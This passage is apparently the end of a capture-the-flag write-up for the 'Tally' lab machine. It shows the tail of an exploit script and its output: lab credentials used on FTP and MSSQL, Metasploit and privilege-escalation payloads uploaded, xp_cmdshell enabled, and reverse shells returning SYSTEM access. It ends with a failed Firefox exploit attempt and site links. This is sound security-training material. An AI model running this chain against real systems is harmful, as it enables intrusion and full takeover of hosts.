</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">ps3</span><span class="o">.</span><span class="n">sock</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="n">failure</span><span class="p">(</span><span class="s2">&#34;Connection timeout.&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">ps3</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span></span></span></code></pre></div></p>

<p>Here is the output:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">[*] LHOST = 10.10.15.247
</span></span></span><span class="line"><span class="cl"><span class="go">[+] Trying to bind to 0.0.0.0 on port 60000: Done
</span></span></span><span class="line"><span class="cl"><span class="go">[+] Waiting for connections on 0.0.0.0:60000: Got connection from 10.10.10.59 on port 50143
</span></span></span><span class="line"><span class="cl"><span class="go">[+] Successful login at ftp server 10.10.10.59 with username &#39;ftp_user&#39; and password &#39;UTDRSCH53c&#34;$6hys&#39;
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Changing current working directory to Intranet
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Uploading msf1.ps1
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Uploading Invoke-PSInject.ps1
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Uploading msf2.ps1
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Uploading cve2017213ps.exe
</span></span></span><span class="line"><span class="cl"><span class="go">[+] Successful login at mssql server 10.10.10.59:1433 with username &#39;sa&#39; and password &#39;GWE3V65#6KFH93@4GWTG2G&#39;
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Enabling &#39;xp_cmdshell&#39;
</span></span></span><span class="line"><span class="cl"><span class="go">[+] Trying to bind to 0.0.0.0 on port 60001: Done
</span></span></span><span class="line"><span class="cl"><span class="go">[+] Waiting for connections on 0.0.0.0:60001: Got connection from 10.10.10.59 on port 50154
</span></span></span><span class="line"><span class="cl"><span class="go">[+] Trying to bind to 0.0.0.0 on port 60002: Done
</span></span></span><span class="line"><span class="cl"><span class="go">[+] Waiting for connections on 0.0.0.0:60002: Got connection from 10.10.10.59 on port 50161
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Switching to interactive mode
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="gp">$</span> whoami
</span></span><span class="line"><span class="cl"><span class="go">nt authority\system
</span></span></span><span class="line"><span class="cl"><span class="go">PS C:\Windows\system32$
</span></span></span></code></pre></div></div></p>

<h1 id="what-about-exploiting-firefox">What about exploiting Firefox</h1>

<p>On the box, there is Firefox version 44.0.2 and a script automatically opens C:\FTP\Intranet\index.html every now and then:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">C:\Users\Sarah\Desktop&gt; type browser.bat
</span></span></span><span class="line"><span class="cl"><span class="go">...
</span></span></span><span class="line"><span class="cl"><span class="go">REM copy latest mockups to webroot
</span></span></span><span class="line"><span class="cl"><span class="go">copy /Y C:\FTP\Intranet\index.html C:\inetpub\wwwroot\HRTJYKYRBSHYJ\index.html
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">REM browse file
</span></span></span><span class="line"><span class="cl"><span class="go">start &#34;&#34; &#34;C:\Program Files (x86)\Mozilla Firefox\Firefox.exe&#34; &#34;http://127.0.0.1:81/HRTJYKYRBSHYJ/index.html&#34;
</span></span></span><span class="line"><span class="cl"><span class="go">...
</span></span></span></code></pre></div></div></p>

<p>In theory, we could exploit it by uploading an evil index.html via the FTP.
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> searchsploit firefox 44.0.2 -w
</span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Firefox 44.0.2 - ASM.JS JIT-Spray Remote Code Execution https://www.exploit-db.com/exploits/44294/
</span></span></span></code></pre></div></div></p>

<p>Unfortunately, I was not able to make it work. I even enabled RDP on the box and I connected to check what is going on. The exploit is opened normally but the firefox either crashes or it doesn&rsquo;t execute the payload properly.</p>

        </div>

        <aside>
          <div class="p-share centered">
            <a href="https://www.buymeacoffee.com/alamot" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-coffee"></i></a>
            <a href="http://www.facebook.com/sharer.php?src=bm&u=https%3a%2f%2falamot.github.io%2ftally_writeup%2f&t=Tally%20write-up" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-facebook"></i></a>
            <a lang="en" href="http://twitter.com/intent/tweet?url=https%3a%2f%2falamot.github.io%2ftally_writeup%2f&text=Tally%20write-up&tw_p=tweetbutton" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-twitter"></i></a>
            <a lang="el" href="http://twitter.com/intent/tweet?url=https%3a%2f%2falamot.github.io%2ftally_writeup%2f&text=%ce%91%ce%bd%ce%ac%ce%bb%cf%85%cf%83%ce%b7%20%cf%84%ce%bf%cf%85%20Tally&tw_p=tweetbutton" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-twitter"></i></a>
            <a lang="en" href="http://pinterest.com/pin/create/link/?url==https%3a%2f%2falamot.github.io%2ftally_writeup%2f&description=Tally%20write-up&media=https://alamot.github.io/images/dart.jpg" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-pinterest-p"></i></a>
            <a lang="el" href="http://pinterest.com/pin/create/link/?url==https%3a%2f%2falamot.github.io%2ftally_writeup%2f&description=%ce%91%ce%bd%ce%ac%ce%bb%cf%85%cf%83%ce%b7%20%cf%84%ce%bf%cf%85%20Tally&media=https://alamot.github.io/images/dart.jpg" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-pinterest-p"></i></a>
          </div>
        </aside>
      </article>
      
      <section id="posts-section">
        <header lang="en"><h3>See also...</h3></header>
        <header lang="el"><h3>Δείτε επίσης...</h3></header>
        <div>
          
          
          
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/matchsticks/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/matchsticks.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Alamot&#39;s matchstick puzzles</h3>
      <h3 class="title" lang="el">Σπιρτοσπαζοκεφαλιές</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">11 Mar 2014</time>
      <time lang="el">11 Μαρ 2014</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/legacy_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/legacy.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Legacy write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Legacy</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">19 Oct 2017</time>
      <time lang="el">19 Οκτ 2017</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/inception_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/mirror.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Inception write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Inception</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">14 Apr 2018</time>
      <time lang="el">14 Απρ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/optimum_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/optimum.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Optimum write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Optimum</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">28 Oct 2017</time>
      <time lang="el">28 Οκτ 2017</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/sense_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/pfsense.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Sense write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Sense</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">24 Mar 2018</time>
      <time lang="el">24 Μαρ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/fulcrum_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/fulcrum.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Fulcrum write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Fulcrum</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">09 Jun 2018</time>
      <time lang="el">09 Ιουν 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/nineveh_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/nineveh.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Nineveh write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Nineveh</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">17 Dec 2017</time>
      <time lang="el">17 Δεκ 2017</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/fluxcapacitor_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/capacitors.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">FluxCapacitor write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του FluxCapacitor</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">13 May 2018</time>
      <time lang="el">13 Μαϊ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/mantis_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/mantis.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Mantis write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Mantis</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">18 Feb 2018</time>
      <time lang="el">18 Φεβ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/node_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/jscode.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Node write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Node</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">03 Mar 2018</time>
      <time lang="el">03 Μαρ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/enterprise_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/space.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Enterprise write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Enterprise</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">19 Mar 2018</time>
      <time lang="el">19 Μαρ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/reddish_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/reddish.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Reddish write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Reddish</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">26 Jan 2019</time>
      <time lang="el">26 Ιαν 2019</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/unattended_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/unattended.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Unattended write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Unattended</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">23 Aug 2019</time>
      <time lang="el">23 Αυγ 2019</time>
    </footer>
  </a>
</article>

           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/querier_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/querier.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Querier write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Querier</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">22 Jun 2019</time>
      <time lang="el">22 Ιουν 2019</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/fortune_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/fortune.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Fortune write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Fortune</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">02 Aug 2019</time>
      <time lang="el">02 Αυγ 2019</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/rold/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/rold.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Retriever of Lost Dreams</h3>
      <h3 class="title" lang="el">Ο Ιχνηλάτης των Χαμένων Ονείρων</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">16 Aug 2015</time>
      <time lang="el">16 Αυγ 2015</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/falafel_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/falafel.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Falafel write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Falafel</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">23 Jun 2018</time>
      <time lang="el">23 Ιουν 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/lacasadepapel_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/ace.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">LaCasaDePapel write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του LaCasaDePapel</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">27 Jul 2019</time>
      <time lang="el">27 Ιουλ 2019</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/minion_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/minions.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Minion write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Minion</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">10 Apr 2018</time>
      <time lang="el">10 Απρ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/oracle/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/oracle.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Ask and you shall receive</h3>
      <h3 class="title" lang="el">Ζήτα και θα λάβεις</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">04 May 2019</time>
      <time lang="el">04 Μαϊ 2019</time>
    </footer>
  </a>
</article>

           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/mssql_shell/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/dbs.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">MSSQL shell with file upload capability</h3>
      <h3 class="title" lang="el">MSSQL κέλυφος με δυνατότητα ανεβάσματος αρχείων</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">13 Apr 2018</time>
      <time lang="el">13 Απρ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/reverse_shells/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/shell.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Reverse shells</h3>
      <h3 class="title" lang="el">Αντίστροφα κελύφη (reverse shells)</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">12 Apr 2018</time>
      <time lang="el">12 Απρ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/get_outlook_rules/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/flying_mail.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">How to collect Outlook rules using Powershell</h3>
      <h3 class="title" lang="el">Πως να συλλέξετε τους κανόνες του Outlook χρησιμοποιώντας Powershell</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">20 May 2022</time>
      <time lang="el">20 Μαϊ 2022</time>
    </footer>
  </a>
</article>

           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/xor_kpa/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/keylock.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Known-plaintext attack tool for XOR-encrypted data</h3>
      <h3 class="title" lang="el">Εργαλείο επιθέσεων γνωστού αρχικού κειμένου έναντι XOR-κρυπτογραφημένων δεδομένων</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">22 Apr 2018</time>
      <time lang="el">22 Απρ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/winrm_shell/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/winrm.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">WinRM shell (a.k.a. PowerShell Remoting) with file upload capability</h3>
      <h3 class="title" lang="el">WinRM κέλυφος (PowerShell Remoting) με δυνατότητα ανεβάσματος αρχείων</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">09 Apr 2018</time>
      <time lang="el">09 Απρ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/path_traversal_archiver/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/path.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Path-traversal archiver</h3>
      <h3 class="title" lang="el">Αρχειοθέτης με διάσχιση διαδρομής</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">14 May 2019</time>
      <time lang="el">14 Μαϊ 2019</time>
    </footer>
  </a>
</article>

           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
        </div>
      </section>
      
    </div>
   </div> 
  </div>


<footer class="l-footer">
<span class="copyleft">&copy;</span>
<span lang="en">&nbsp; Antonios Tsolis &nbsp; </span>
<span lang="el">&nbsp; Αντώνιος Τσώλης &nbsp; </span>
<script>
  function email(starting,server,firstname,lastname,subject,body,closing) {
